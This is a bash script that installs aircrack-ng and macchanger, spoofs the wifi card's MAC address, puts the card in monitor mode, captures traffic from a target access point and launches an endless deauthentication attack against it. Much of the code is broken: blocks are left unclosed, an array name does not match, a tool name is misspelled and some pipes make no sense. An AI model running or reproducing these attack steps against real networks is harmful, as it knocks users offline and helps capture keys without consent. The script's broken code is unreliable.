#! /bin/bash
source .env 

cat /etc/os-release > check_Os
source check_Os

install (){
    if [[ "$ID_LIKE" == "debian" ]]
    then
        apt update && apt upgrade -y
        apt install macchanger net-tools aircrack-ng -y
    elif [[ "$ID_LIKE" == "arch" ]]
    then
        pacman -Syu
        pacman -S macchanger net-tools aircrack-ng -y
    else
        echo "what kind of f*uck*ng OS do you have ?"
    fi
}

Choose_antenna () {
    PS3='Choose your Alfa: '
    foods=("Usb-B" "USB-C")
    select fav in "${alfa[@]}"; do
        case $fav in
            "Usb-B")
                echo "So you have the $fav Alfa"
                echo "you don't have necessary to install drivers, normally every linux have the packets"
                ;;
            "USB-C")
                if [[ "$ID_LIKE" == "debian" ]]
                then
                    echo "So you have the $fav Alfa"
                    apt install realtek-rtl88xxau-dkms -y
                else
                    echo "So you have the $fav Alfa"
                    pacman -S realtek-rtl88xxau-dkms -y
                ;;
}

capture () {
    iwconfig > netcard.txt
        if [ -s netcard.txt ]
        then
            cut -d ' ' -f 1 netcard.txt | tr -d ' ' | sort | uniq > netcard1.txt | sed '1d' > netcard.txt
            ifconfig $(cat netcard.txt) down
            macchanger $(cat netcard.txt) -r
            iwconfig $(cat netcard.txt) mode monitor
            cut -d ' ' -f 1 netcard.txt | tr -d ' ' | sort | uniq > netcard1.txt | sed '1d' > netcard.txt
            airmong-ng start $(cat netcard.txt)
            airodump-ng -w capture_of`date +%Y-%m-%d-%H-%M` -c 2 --bssid xx:xx:xx:xx:xx:xx $(cat netcard.txt)
            aireplay-ng --deauth 0 -a xx:xx:xx:xx:xx:xx $(cat netcard.txt)

        else 
            echo "Are you sure about the connection of your alfa card, so check the connexion or the drivers or the name of your wlan network"
    }

Choose_antenna install capture
